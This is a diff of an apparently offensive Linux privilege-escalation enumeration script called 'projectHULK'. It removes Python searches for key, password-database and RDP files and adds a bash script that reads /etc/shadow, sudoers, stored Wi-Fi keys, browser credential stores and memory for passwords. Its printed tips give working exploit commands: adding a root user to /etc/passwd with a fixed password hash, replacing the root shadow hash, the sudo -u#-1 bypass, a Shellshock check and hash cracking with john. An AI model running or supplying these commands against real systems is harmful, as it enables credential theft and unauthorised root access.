-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] .gpg Files:\033[0m")
-os.system ("find / -name *.gpg -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always")
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║A GPG file is a security key used to decrypt an encrypted file generated by GNU║")
-print("\t  ║Privacy Guard (GnuPG), a file encryption program. The secure format is based on║")
-print("\t  ║the OpenPGP standard defined by RFC2440,the same standard Pretty Good Privacy  ║")
-print("\t  ║(.PGP) files use.                                                              ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] KeePass database file:\033[0m")
-print("[*] .kdbx files:")
-os.system ("find / -name *.kdbx -type f 2>/dev/null --color=always")
-print("[*] .kdb files:")
-os.system ("find / -name *.kdb -type f 2>/dev/null --color=always")
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║KeePass is a free open source password manager, which helps you to manage your ║")
-print("\t  ║passwords in a secure way. You can store all your passwords in one database,   ║")
-print("\t  ║which is locked with a master key. There are many exploits on the internet.    ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Print IPSEC VPN Keys (requires root):\033[0m")
-os.system ("ip xfrm state list")
-print("\n\033[0;37;44m[+] OpenLDAP Configuration:\033[0m")
-os.system ("cat /etc/openldap/ldap.conf 2>/dev/null")
-print("\n\033[0;37;44m[+] Current user trash files:\033[0m")
-os.system ("ls -la ~/.local/share/Trash/ 2>/dev/null")
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Have a look at the trash files and see if you can find any useful information. ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Wireshark files:\033[0m")
-os.system ("find / -name *.pcapng -type f 2>/dev/null --color=always")
-os.system ("find / -name *.libpcap -type f 2>/dev/null --color=always")
-print("\n\033[0;37;44m[+] RDP Profiles:\033[0m")
-os.system ("find / -name *.RDP -type f 2>/dev/null --color=always")
-os.system ("find / -name *.rdp -type f 2>/dev/null --color=always")
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Decode the RDP Password using Cain & Abel. So, open Cain & Adel the go to      ║")
-print("\t  ║Tools > Remote Desktop Password Decoder $ then load the RDP profile to decode. ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\n\033[01;31m\t\t\tEnumeration is completed ╔════════════════════════════════════════(100%)════════════════════════════════════════╗\033[0m\n\n")
+    \t\t                   ████"
+sleep 1
+echo -e "\n${BLUE}Author:\033[0m"
+sleep 0.1
+echo -e "\t     Iʀᴏɴ Hᴜʟᴋ"
+echo -e "\tMᴀɴ Iɴ A Bʟᴀᴄᴋ Tᴜxᴇᴅᴏ"
+sleep 0.1
+echo -e "\n${BLUE}Tweet Me:\033[0m"
+sleep 0.1
+echo -e "\tɪʀᴏɴʜᴜʟᴋ_x69"
+sleep 0.1
+echo -e "\n${BLUE}Message:\033[0m"
+sleep 0.1
+echo -e "\tAʟʟ ᴛʜᴇ ᴇxᴘʟᴏɪᴛs ʜᴀᴠᴇ ʙᴇᴇɴ ʟɪsᴛᴇᴅ ʙᴀsᴇᴅ ᴏɴ ᴛʜᴇ ᴀᴜᴛʜᴏʀ's ᴏᴘɪɴɪᴏɴ, ʏᴏᴜ ᴍᴀʏ ᴜsᴇ ᴀɴʏ ᴏғ ʏᴏᴜʀ ᴄʜᴏɪᴄᴇ. Rᴇᴍᴇᴍᴇʙʀ, SKY HAS NO LIMITS :)"
+sleep 0.1
+echo -e "\n${BLUE}Recommendation:\033[0m"
+sleep 0.1
+echo -e "\tFᴏʀ ᴀ ʙᴇᴛᴛᴇʀ ᴠɪᴇᴡ ᴏғ ᴛʜᴇ ʀᴇᴘᴏʀᴛ ɪs ɪᴛ ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ ʀᴇᴅɪʀᴇᴄᴛɪɴɢ ᴛʜᴇ ᴏᴜᴛᴘᴜᴛ ᴛᴏ ᴀ ғɪʟᴇ: ./ᴘʀᴏᴊᴇᴄᴛHULK.sʜ > PE_ʀᴇᴘᴏʀᴛ.ᴛxᴛ"
+echo -e "\tNᴇᴠᴇʀ ʀᴇʟᴀʏ ᴏɴ ᴀ sɪɴɢʟᴇ ᴛᴏᴏʟ, ᴅᴏ ᴍᴀɴᴜᴀʟ ᴇɴᴜᴍᴇʀᴀᴛɪᴏɴ ᴀɴᴅ ᴛʀʏ ᴛᴏ ᴜsᴇ ᴍᴀɴʏ ᴛᴏᴏʟs ᴀs ᴍᴜᴄʜ ᴀs ʏᴏᴜ ᴄᴀɴ."
+echo -e "\n${BLUE}Scan Started At:\033[0m"
+echo -e "\t"; date
+sleep 5
+echo -e "\n\n${RED}\t\tEnumeration on progress ╔═.......................................(1%)...........................................\033[0m\n"
+sleep 5
+echo -e "\t${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
+echo -e "\t${RED}  ════════════════════════════════════════════════════════════[ Current User Information ]════════════════════════════════════════════════════════ \033[0m"
+echo -e "\t${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
+echo -e "\n"
+sleep 1
+echo -e "\n${BLUE}[+] Current user is:\033[0m"
+    whoami 2>/dev/null 
+echo -e "\n${BLUE}[+] Sudo privileged access:\033[0m"
+    sudo -ln | grep -E --color=always 'NOPASSWD|ALL|$'
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Incase you have the password, run: sudo -l and find a way to exploit that file║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Who's logged in:\033[0m"
+    w
+echo -e "\n${BLUE}[+] Login History:\033[0m"
+    last -Faiw | last | grep still --color=always
+echo -e "\n${BLUE}[+] Last Log In:\033[0m"
+    lastlog | grep -v "**Never logged in**" 
+echo -e "\n${BLUE}[+] Root Users:\033[0m"
+    awk -F: '($3 == '0') {print}' /etc/passwd | grep root --color=always
+echo -e "\n${BLUE}[+] Users with console:\033[0m"
+    cat /etc/passwd | grep --color=always '/bin/bash\|/bin/sh\|/bin/zsh'
+echo -e "\n${BLUE}[+] Total number of users:\033[0m"
+    getent passwd | wc -l
+echo -e "\n${BLUE}[+] Can we read other users’ history files?\033[0m"
+    find /* -name *.*history* -print 2>/dev/null
+echo -e "\n${BLUE}[+] Are we in a restricted shell?\033[0m"
+    env | grep -i "rbash\|chroot"
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Bypass Restricted Shell:                                                              ║"
+        echo -e "\t  ║https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] User ID:\033[0m"
+    id 2>/dev/null 
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Sometimes, the user may be a part of a vulnerable group such as: lxd/lxc,     ║"
+        echo -e "\t  ║Docker, Wheel, Shadow, Disk, Video. Every group worths Googling for exploit.  ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] User Group & possible escap:\033[0m"
+    id | grep --color=always -i "docker\|lxd\|sambashare\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow" 2>/dev/null
+        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Docker group:                                                                                                    ║"
+        echo -e "\t  ║https://gtfobins.github.io/gtfobins/docker/                                                                      ║"
+        echo -e "\t  ║https://www.hackingarticles.in/docker-privilege-escalation/                                                      ║"
+        echo -e "\t  ║=================================================================================================================║"
+        echo -e "\t  ║LXD/LXC group:                                                                                                   ║"
+        echo -e "\t  ║https://www.hackingarticles.in/lxd-privilege-escalation/                                                         ║"
+        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/                           ║"
+        echo -e "\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation ║"
+        echo -e "\t  ║=================================================================================================================║"
+        echo -e "\t  ║Samashare group:                                                                                                 ║"
+        echo -e "\t  ║https://www.securityfocus.com/bid/9619/exploit                                                                   ║"
+        echo -e "\t  ║=================================================================================================================║"
+        echo -e "\t  ║lpadmin group:                                                                                                   ║"
+        echo -e "\t  ║https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791                                                         ║"
+        echo -e "\t  ║Usually members of the group adm have permissions to read log files located inside /var/log/                     ║"
+        echo -e "\t  ║Usually members of the group adm have permissions to read log files located inside /var/log/                     ║"
+        echo -e "\t  ║=================================================================================================================║"
+        echo -e "\t  ║sudo/admin group:                                                                                                ║"
+        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
+        echo -e "\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
+        echo -e "\t  ║=================================================================================================================║"
+        echo -e "\t  ║Video group:                                                                                                     ║"
+        echo -e "\t  ║The video group can be used locally to give a set of users access to a video device or to the screen output.     ║"
+        echo -e "\t  ║This could be exploit d by taking a screenshot of the current screen output and gathering any private information║"
+        echo -e "\t  ║such as user passwords or hashes.                                                                                ║"
+        echo -e "\t  ║Esc from video:-                                                                                                 ║"
+        echo -e "\t  ║https://github.com/frizb/Linux-Privilege-Escalation                                                              ║"
+        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
+        echo -e "\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
+        echo -e "\t  ║=================================================================================================================║"
+        echo -e "\t  ║Disk group:                                                                                                      ║"
+        echo -e "\t  ║The disk group provides users with access to the raw data contained in disks and partitions.                     ║"
+        echo -e "\t  ║Esc from disk:-                                                                                                  ║"
+        echo -e "\t  ║https://github.com/frizb/Linux-Privilege-Escalation                                                              ║"
+        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
+        echo -e "\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
+        echo -e "\t  ║=================================================================================================================║"
+        echo -e "\t  ║Shadow group:                                                                                                    ║"
+        echo -e "\t  ║Since users in this group have access to view the /etc/shadow file, this can be exploit d by cracking password   ║"
+        echo -e "\t  ║hashes found in it.                                                                                              ║"
+        echo -e "\t  ║Esc from shadow:-                                                                                                ║"
+        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
+        echo -e "\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
+        echo -e "\t  ║=================================================================================================================║"
+        echo -e "\t  ║Adm group:                                                                                                       ║"
+        echo -e "\t  ║Usually members of the group adm have permissions to read log files located inside /var/log/. take a look :D     ║"
+        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n"
+echo -e "\t${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
+echo -e "\t${RED}  ══════════════════════════════════════════════════════[ Password File Permission & Users ]══════════════════════════════════════════════════════ \033[0m"
+echo -e "\t${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
+echo -e "\n"
+sleep 1
+echo -e "\n${BLUE}[+] Each field is separated by a colon, and represents a different attribute to the user:\033[0m"
+        echo -e "\t  ╔════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║<Username>:<Password>:<UserID>:<GroupID>:<GecosField>:<HomeDirectory>:<Shell>   ║"
+        echo -e "\t  ║If an -x- is representing the password field, this indicates that the password  ║"
+        echo -e "\t  ║is encrypted.                                                                   ║"
+        echo -e "\t  ╚════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Password file:\033[0m"
+    ls -la /etc/passwd --color=always
+        echo -e "\t  ╔════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If the file has written permission, it can be abused by adding a new user with  ║"
+        echo -e "\t  ║root privilege to the file. If it's no't writable, then it's protected.         ║"
+        echo -e "\t  ║${RED}exploit :\033[0m                                                                       ║"
+        echo -e "\t  ║${RED}First, generate a password with one of the following commands:\033[0m                  ║"
+        echo -e "\t  ║    ${RED}openssl passwd -1 -salt hulk password\033[0m                                       ║"
+        echo -e "\t  ║    ${RED}perl -le 'print crypt(hulk, password)'\033[0m                                      ║"
+        echo -e "\t  ║${RED}Rewrite the password file:\033[0m                                                      ║"
+        echo -e "\t  ║    ${RED}echo 'hulk:HASH:0:0::/root:/bin/bash' >> /etc/passwd\033[0m                        ║"
+        echo -e "\t  ║${RED}Then do: su hulk\033[0m                                                                ║"
+        echo -e "\t  ║Read more:                                                                      ║"
+        echo -e "\t  ║https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/║"
+        echo -e "\t  ║Protect the file by limiting the access to it:                                  ║"
+        echo -e "\t  ║chmod 600 /etc/passwd                                                           ║"
+        echo -e "\t  ╚════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Reading Password File:\033[0m"
+    cat /etc/passwd | grep -E ":0:0:|$"
+echo -e "\n${BLUE}[+] Hash in Password file:\033[0m"
+    grep  -v 'x' /etc/passwd
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If any hash is found in the /etc/passwd, the attacker my try to crack it by using  ║"
+        echo -e "\t  ║any hash cracker software, tool or website.                                        ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Shadow file:\033[0m"
+    ls -la /etc/shadow --color=always
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If the file has read/write permission, it can abuse by replacing the root HASH     ║"
+        echo -e "\t  ║with the attacker's HASH or the attacker my copy the hash & try to crack it.       ║"
+        echo -e "\t  ║${RED}exploit :\033[0m                                                                          ║"
+        echo -e "\t  ║${RED}1) Generate a new Shadow Hash and replace it with the\033[0m                              ║"
+        echo -e "\t  ║   ${RED}current root hash:\033[0m                                                              ║"
+        echo -e "\t  ║    ${RED}- mkpasswd  -m sha-512 -S prove123 -s\033[0m                                          ║"
+        echo -e "\t  ║${RED}2) Open the shadow file using any text edirot of your choice:\033[0m                      ║"
+        echo -e "\t  ║   ${RED}or copy your HASH from your system and replace it with\033[0m                          ║"
+        echo -e "\t  ║   ${RED}the root hash\033[0m                                                                   ║"
+        echo -e "\t  ║${RED}3) Login to root using your password\033[0m                                               ║"
+        echo -e "\t  ║${RED}4) Or Simply do:\033[0m                                                                   ║"
+        echo -e "\t  ║${RED}echo 'privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash' >> /etc/passwd\033[0m             ║"
+        echo -e "\t  ║${RED}This adds a root privilege user 'privesc' with the password 'password'\033[0m             ║"
+        echo -e "\t  ║Read More:                                                                         ║"
+        echo -e "\t  ║https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html ║"
+        echo -e "\t  ║Protect the file by limiting the access to it:                                     ║"
+        echo -e "\t  ║chmod 600 /etc/shadow                                                              ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Reading shadow File:\033[0m"
+    cat /etc/shadow 
+echo -e "\n${BLUE}[+] Hash in Shadow file: (Interesting :D)\033[0m"
+    grep  -v '*:\|!:' /etc/shadow
+        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Crack the hash using online website or any cracking tools or simply do:                              ║"
+        echo -e "\t  ║    unshadow /etc/passwd /etc/shadow > shadow.john                                                   ║"
+        echo -e "\t  ║    john shadow.john --wordlist=<WORLD_LIST>                                                         ║"
+        echo -e "\t  ║If you own the system and have root, you can use MimiPenguin to crack it:                            ║"
+        echo -e "\t  ║    https://github.com/huntergregal/mimipenguin                                                      ║"
+        echo -e "\t  ║    https://github.com/sevagas/swap_digger                                                           ║"
+        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Sudoers File:\033[0m"
+    ls -la /etc/sudoers --color=always
+        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║<Username> <All terminal>=<All user>:<All Group> <comand to execute>                                 ║"
+        echo -e "\t  ║Read more:                                                                                           ║"
+        echo -e "\t  ║https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d ║"
+        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Reading Sudoers File:\033[0m"
+    cat /etc/sudoers | grep -E --color=always 'ALL|$'
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║The file shows a fully detailed about what the current user my run as root. If the running file or the║"
+        echo -e "\t  ║application has a global vulnerability, the attacker may google it and abuse it for user escalation.  ║"
+        echo -e "\t  ║https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d  ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] User Group list:\033[0m"
+    ls -la /etc/group --color=always
+echo -e "\n${BLUE}[+] Content of User Group list:\033[0m"
+    cat /etc/group 
+echo -e "\n${BLUE}[+] Password Policy:\033[0m"
+    grep --color=always "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 
+echo -e "\n${BLUE}[+] WiFi Creds:\033[0m"
+    ls -la /etc/NetworkManager/system-connections
+        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Try to read the following files manually and see if they have any passwords stored inside them.      ║"
+        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Sensitive files:\033[0m"
+    ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null
+        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║See if any listed files have weak file permission.                                                   ║"
+        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] htpasswd:\033[0m"
+    find / -name .htpasswd -print -exec cat {} \; 2>/dev/null 
+        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║It is a flat-file used to store usernames and password. This file is generally used by the web server║"
+        echo -e "\t  ║software like Apache, Nginx, etc. in order to verify the users via HTTP basic authentication they are║"
+        echo -e "\t  ║in ASCII text format. The hash maybe cracked using online tools or any cracking password tools.      ║"
+        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] In memory passwords:\033[0m"
+    strings /dev/mem -n10 | grep -i PASS
+echo -e "\n${BLUE}[+] Old passwords:\033[0m"
+    ls -la /etc/security/opasswd --color=always
+echo -e "\n${BLUE}[+] Reading Old passwords:\033[0m"
+    cat /etc/security/opasswd
+echo -e "\n${BLUE}[+] Root History File:\033[0m"
+    s -la /root/.*_history --color=always 2>/dev/null
+echo -e "\n${BLUE}[+] Password Files:\033[0m"
+    find / -name passwd -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
+echo -e "\n${BLUE}[+] apache2.conf:\033[0m"
+    cat /etc/apache2/apache2.conf | grep -i "pass\|cred\|hash" --color=always
+        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Read the full file for more inofrmation.                                                             ║"
+        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] smb.conf:\033[0m"
+    cat /etc/samba/smb.conf | grep -i 'pass\|cred\|hash' --color=always
+        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║To list all files having the word password/credentials/hash do the following manually:               ║"
+        echo -e '\t  ║grep -rn -i "pass\|cred\|hash" / --color=always > password.txt                                       ║'
+        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        echo -e "\n${BLUE}[+] Dump cleartext Pre-Shared Wireless Keys:\033[0m"
+    cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"
+echo -e "\n${BLUE}[+] Configuration files that might contain sensitive information:\033[0m"
+    grep "pass\|cred\|hash" /etc/*.conf 2>/dev/null --color=always
+echo -e "\n${BLUE}[+] Firefox credentials:\033[0m"
+    ls -la /home/$USER/.mozilla/firefox 2>/dev/null
+        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Password files are:                                                                                  ║"
+        echo -e "\t  ║  key4.db                                                                                            ║"
+        echo -e "\t  ║  logins.json                                                                                        ║"
+        echo -e "\t  ║Read more about where Firefox stores your bookmarks, passwords and other user data:                  ║"
+        echo -e "\t  ║    https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data                     ║"
+        echo -e "\t  ║You can use firefox_decrypt.py tool:                                                                 ║"
+        echo -e '\t  ║    https://github.com/unode/firefox_decrypt                                                         ║'
+        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n"
+echo -e "\t${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
+echo -e "\t${RED}  ═════════════════════════════════════════════════════════════[ System Information ]═════════════════════════════════════════════════════════════ \033[0m"
+echo -e "\t${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
+echo -e "\n"
+sleep 1
+echo -e "\n${BLUE}[+] System Name:\033[0m"
+    uname -a 2>/dev/null
+        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Useful tools to help you in finding kernel exploit :                                                 ║"
+        echo -e '\t  ║  https://github.com/spencerdodd/kernelpop                                                           ║'
+        echo -e '\t  ║  https://github.com/jondonas/linux-exploit-suggester-2                                              ║'
+        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+        echo -e "\n${BLUE}[+] System Release:\033[0m"
+    lsb_release -a 2>/dev/null 
+echo -e "\n${BLUE}[+] Host name:\033[0m"
+    hostname 2>/dev/null 
+echo -e "\n${BLUE}[+] System Version:\033[0m"
+    cat /proc/version 
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║The version is not listed in our database. However, make sure to keep your    ║"
+        echo -e "\t  ║system always up-to-date. Old version are always vulnerable. Visit the link   ║"
+        echo -e "\t  ║bellow for more details:                                                      ║"
+        echo -e "\t  ║  https://github.com/SecWiki/linux-kernel-exploits                            ║"
+        echo -e '\t  ║Or use:                                                                       ║'
+        echo -e '\t  ║    searchsploit "Linux version"                                              ║'
+        echo -e '\t  ║    https://github.com/InteliSecureLabs/Linux_Exploit_Suggester               ║'
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+        echo -e "\n\033[0;37;41mList of vulnerable kernel versions:\033[0m"
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║3.9.6 3.9.0 3.9 3.8.9 3.8.8 3.8.7 3.8.6 3.8.5 3.8.4 3.8.3 3.8.2 3.8.1 3.8.0 3.8 3.7.6 3.7.0 3.7 3.6.0 3.6 ║"
+        echo -e "\t  ║3.5.0 3.5 3.4.9 3.4.8 3.4.6 3.4.5 3.4.4 3.4.3 3.4.2 3.4.1 3.4.0 3.4 3.3 3.2 3.19.0 3.16.0 3.15 3.14 3.13.1║"
+        echo -e "\t  ║3.13.0 3.13 3.12.0 3.12 3.11.0 3.11 3.10.6 3.10.0 3.10 3.1.0 3.0.6 3.0.5 3.0.4 3.0.3 3.0.2 3.0.1 3.0.0    ║"
+        echo -e "\t  ║2.6.9 2.6.8 2.6.7 2.6.6 2.6.5 2.6.4 2.6.39 2.6.38 2.6.37 2.6.36 2.6.35 2.6.34 2.6.33 2.6.32 2.6.31 2.6.30 ║"
+        echo -e "\t  ║2.6.3 2.6.29 2.6.28 2.6.27 2.6.26 2.6.25 2.6.24.1 2.6.24 2.6.23 2.6.22 2.6.21 2.6.20 2.6.2 2.6.19 2.6.18  ║"
+        echo -e "\t  ║2.6.17 2.6.16 2.6.15 2.6.14 2.6.13 2.6.12 2.6.11 2.6.10 2.6.1 2.6.0 2.4.9 2.4.8 2.4.7 2.4.6 2.4.5 2.4.4   ║"
+        echo -e "\t  ║2.4.37 2.4.36 2.4.35 2.4.34 2.4.33 2.4.32 2.4.31 2.4.30 2.4.29 2.4.28 2.4.27 2.4.26 2.4.25 2.4.24 2.4.23  ║"
+        echo -e "\t  ║2.4.22 2.4.21 2.4.20 2.4.19 2.4.18 2.4.17 2.4.16 2.4.15 2.4.14 2.4.13 2.4.12 2.4.11 2.4.10 2.2.24         ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Sudo Version:\033[0m"
+    sudo -V | grep --color=always "Sudo version" 2>/dev/null 
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║The version is not listed in our database. However, make sure to keep your    ║"
+        echo -e "\t  ║system always up-to-date. Old version are vulnerable. Use Google for more     ║"
+        echo -e "\t  ║details or use:                                                               ║"
+        echo -e '\t  ║searchsploit "sudo"                                                           ║'
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Is sudo version vulnerable?\033[0m"
+    sudo -V | grep --color=always "Sudo ver" | grep --color=always "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]" 
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If the sudo version <= v1.28, it is exploitable.                              ║"
+        echo -e "\t  ║${RED}exploit :\033[0m                                                                     ║"
+        echo -e "\t  ║  ${RED}sudo -u#-1 /bin/bash\033[0m                                                        ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Available shells:\033[0m"
+    cat /etc/shells 2>/dev/null
+echo -e "\n\033[0;37;44m[+] Bash version:\033[0m"
+    bash --version | grep version 2>/dev/null
+echo -e "\n\033[0;37;44m[+] Check Bash Shellshock vulnerability:\033[0m"
+    env x='() { :;}; echo bash is vulnerable' bash -c 'echo bash is not vulnerable'
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Other test:                                                                                               ║"
+        echo -e "\t  ║https://serverfault.com/questions/631257/how-to-test-if-my-server-is-vulnerable-to-the-shellshock-bug     ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Path Environment:\033[0m"
+    systemctl show-environment 2>/dev/null 
+echo -e "\n${BLUE}[+] System Path:\033[0m"
+    path_path= echo $PATH 
+echo -e "$path_path"
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║If you have write permissions on any folder inside the PATH variable you may be able to hijack║"
+        echo -e "\t  ║some libraries or binaries. Read more:                                                        ║"
+        echo -e "\t  ║https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-pwnlab-init/ ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Lists block devices (hardrives, memory cards, etc):\033[0m"
+    lsblk -a 
+echo -e "\n${BLUE}[+] Lists USB devices:\033[0m"
+    lsusb 
+echo -e "\n${BLUE}[+] Information about SATA Devices for /dev/sda1:\033[0m"
+    hdparm /dev/sda1 2>/dev/null 
+echo -e "\n${BLUE}[+] Linux File System Information:\033[0m"
+    fdisk -l 2>/dev/null 
+echo -e "\n${BLUE}[+] List of running services:\033[0m"
+    service --status-all 
+echo -e "\n${BLUE}[+] File-systems mounted:\033[0m"
+    df -h 2>/dev/null
+echo -e "\n${BLUE}[+] ASLR Settings:\033[0m"
+    cat /proc/sys/kernel/randomize_va_space
+        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Valid Settings:                                                                               ║"
+        echo -e "\t  ║0 = Disablabed                                                                                ║"
+        echo -e "\t  ║1 = Conservative Randomization                                                                ║"
+        echo -e "\t  ║2 = Full Randomization                                                                        ║"
+        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] ASLR Address Space:\033[0m"
+    ldd /bin/bash
+echo -e "\n${BLUE}[+] SELinux status:\033[0m"
+    sestatus 2>/dev/null
